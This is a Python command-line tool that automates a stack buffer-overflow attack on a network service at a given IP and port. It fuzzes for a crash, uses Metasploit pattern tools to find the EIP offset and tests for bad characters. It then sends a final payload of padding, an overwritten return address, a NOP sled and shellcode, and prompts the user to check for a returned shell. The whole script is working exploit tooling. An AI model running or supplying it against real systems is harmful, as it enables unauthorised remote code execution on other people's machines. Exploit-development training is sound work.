#!/usr/bin/env python3

import socket, time, sys, argparse, subprocess

def main():

  # Parse the command line arguments
  parser = argparse.ArgumentParser(description='Python based fuzzer with lots of options')
  parser.add_argument('-a', '--action', choices=["fuzz", "pattern", "offset", "chars", "verify", "exploit"], help="What action you want to perform on the application, either a fuzz, a pattern create, offset determination, or bad characters")
  parser.add_argument('-i', '--ip', type=str, help="IP address of system to fuzz", required=True)
  parser.add_argument('-p', '--port', type=int, help="Port number of service/application to fuzz", required=True)
  parser.add_argument('-s', '--start', default="", type=str, help="(DEFUALT = None) Start of the string you want to send to application")
  parser.add_argument('-e', '--end', default="", type=str, help="(DEFUALT = None) End of the string you want to send to application")
  parser.add_argument('-l', '--length', type=int, help="Length of the pattern you want to send")
  parser.add_argument('-q', '--query', type=str, help="Value found in EIP when debugger crashed from the pattern create")
  parser.add_argument('-x', '--exclude', default="", type=str, help='(FORMAT = "0f83e189") The chars to exclude in bad char test')
  parser.add_argument('-o', '--offset', type=int, help="The offset of the EIP")
  parser.add_argument('-r', '--eip', type=str, help='(FORMAT = "0f83e189") The new EIP value you want to send in your payload as a string')
  parser.add_argument('-c', '--shellcode', type=str, help='The /path/to/shellcode you want sent in the buffer')
  parser.add_argument('-t', '--timeout', default=2, type=int, help='(DEFAULT = 2s) How long the timeout should be for the connection')
  args = parser.parse_args()

  # Get relevant args
  action = args.action
  ip = args.ip
  port = args.port
  start = args.start
  end = args.end
  length = args.length
  query = args.query
  exclude = args.exclude
  offset = args.offset
  eip = args.eip
  shellcode = args.shellcode
  timeout = args.timeout

  # Convert some of the args
  start = str.encode(start)
  end = str.encode(end)

  # Helper functions
  def socket_send(payload, print_before="", print_after=""):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      if (len(print_before) > 0): print(print_before)
      s.send(payload)
      s.recv(1024)
      if (len(print_after) > 0): print(print_after)

  def print_next_posssible_command():
    print('[*] Possible next command:')
    script = f'    ./biff-the-buffer.py -i {ip} -p {port} -s "{start.decode("utf-8")}" -e "{end.decode("utf-8")}"'

    # Determine which action was used
    if (action == 'fuzz'):
      script += f' -a pattern -l {length}'
    elif (action == 'pattern'):
      script += ' -a offset -q "value_of_eip"'
    elif (action == 'offset'):
      script += f' -a verify -o {offset.decode("utf-8")}'
    elif (action == 'verify'):
      script += f' -a chars -o {offset.decode("utf-8")} -x "<bytes_to_exclude>"'
    elif (action == 'chars'):
      script += f' -a exploit -c /path/to/shellcode -r "new_eip"'

    print(script)

  # Create string to send to app
  if action == 'fuzz':
    inc = 1
    string = start + b"A" * 100 + end

    while True:
      num_bytes = 100 * inc
      string = start + b"A" * num_bytes + end
      current_length = (len(string) - len(start))
      try:
        socket_send(string, f"[*] Fuzzing with {current_length} bytes")
      except:
        print(f"[*] Fuzzing crashed at {current_length} bytes")
        length = current_length
        print_next_posssible_command()
        sys.exit(0)
      inc += 1
      time.sleep(1)

  elif action == 'pattern':
    if (length is None): raise Exception("[X] Must supply a length if using pattern")
    pattern = create_pattern(length)
    string = start + pattern + end
    try:
      socket_send(string, f"[*] Sending pattern of size {length}", "[*] Patern sent")
    except:
      print_next_posssible_command()
  
  elif action == 'chars':
    if (offset is None): raise Exception("[X] Must supply an offset if using chars")
    try:
      all_chars = get_all_bytes(excluded_bytes=bytes.fromhex(exclude))
      payload = [
        start,
        b'A' * (offset),
        end,
        b'B' * (4),
        all_chars
      ]
      payload = b"".join(payload)
      socket_send(payload, f"[*] Sending all possible bytes (length={len(payload)} bytes)", "[*] All possible bytes sent")
    except:
      print("[*] Check your debugger for a crash")
      print_next_posssible_command()

  elif action == 'offset':
    if (query is None): raise Exception("[X] Must supply a query if using offset")
    print(f"[*] Finding offset of the query {query}")
    query = query.strip()
    result = determine_offset(query)
    offset = result[26:]
    print(result.decode("utf-8").strip())
    print_next_posssible_command()

  elif action == 'verify':
    if (offset is None): raise Exception("[X] Must supply an offset if using verify")
    print(f"[*] Verifying the offset and seding additional data")

    # Build the payload
    payload = [
      start,
      b"A" * (offset), # The overflow
      end,
      b"B" * 4, # The new EIP
      b"C" * 1000, # The Stack 
    ]
    payload = b"".join(payload)
    try:
      socket_send(payload, "[*] Sending verification payload", "[*] Payload sent")
    except:
      print("[*] Check your debugger for a crash with EIP being 42424242")
      print("[*] If debugger has correct EIP, then you now should evaluate where to put your shellcode")
      print("[*] Remember, you may need to add to registers to skip over the start value if provided")
      if (len(start) > 0):
        print(f'[*] In this case you may need "add <register>,{len(start)}"')
      print_next_posssible_command()

  elif action == 'exploit':
    if (offset is None): raise Exception("[X] Must supply the offset if using exploit")
    if (shellcode is None): raise Exception("[X] Must supply a path to shellcode if using exploit")
    if (eip is None): raise Exception("[X] Must supply an eip if using exploit")

    # Warn user of EIP
    print("[!] If your EIP contains a bad character, the exploit will fail")

    # Pack the bytes into little edian
    eip = bytes.fromhex(eip)
    eip_array = bytearray(eip)
    eip_array.reverse()
    eip = bytes(eip_array)

    # Check for shellcode file
    print("[*] Getting shellcode file provided")
    shellcode_string = b""
    with open(shellcode, 'rb') as shellcode:
      byte_in_file = shellcode.read(1)
      while byte_in_file:
        shellcode_string += byte_in_file
        byte_in_file = shellcode.read(1)

    # shellcode_string = bytearray(shellcode_string)
    # shellcode_string.reverse()
    # shellcode_string = bytes(shellcode_string)

    # Build the payload
    print("[*] Building full payload")
    payload = [
      start,
      b'A' * (offset),
      end,
      eip,
      b'\x90' * 16,
      shellcode_string
    ]
    payload = b"".join(payload)
    try:
      socket_send(payload, "[*] Sending shellcode")
    except:
      print('[*] Check for a shell being returned')


def system_call(command, timeout=0):
  if (timeout == 0):
    return subprocess.check_output(command, stderr=subprocess.STDOUT)
  return subprocess.check_output(command, stderr=subprocess.STDOUT, timeout=timeout)

def determine_offset(pattern_in_eip, path_to_pattern_offset="/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb"):
  return system_call([path_to_pattern_offset, "-q", f"{pattern_in_eip}"]) 

def create_pattern(length, path_to_pattern_create="/usr/share/metasploit-framework/tools/exploit/pattern_create.rb"):
  return system_call([path_to_pattern_create, "-l", f"{length}"]) 

def get_all_bytes(include_null=False, excluded_bytes=b""):
  byte_string = b""
  begin = 1
  if (include_null): begin = 0
  for i in range(begin, 256):
    byte_val = i.to_bytes(1, "big")
    # If the excluded bytes does not have that byte, then add it
    if(excluded_bytes.find(byte_val) == -1):
      byte_string = byte_string + byte_val
  return byte_string

if __name__ == "__main__":
  main()
